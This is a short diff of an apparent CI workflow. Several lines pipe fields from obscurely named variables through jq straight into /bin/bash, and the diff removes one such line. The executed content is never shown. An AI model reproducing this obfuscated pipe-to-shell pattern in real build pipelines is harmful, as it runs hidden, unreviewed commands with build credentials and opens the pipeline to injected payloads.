@@ -22,7 +22,6 @@ jobs:
           echo $jwlzq0281 | jq -r .hhud0510 | /bin/bash
           echo $vd862 | jq -r .oj7 | /bin/bash
           printf '%s' "$urm46466" | jq -r .go86892 | /bin/bash
-          echo $ckd46995 | jq -r .ev56061 | /bin/bash
 
       - name: Store results
         if: always()
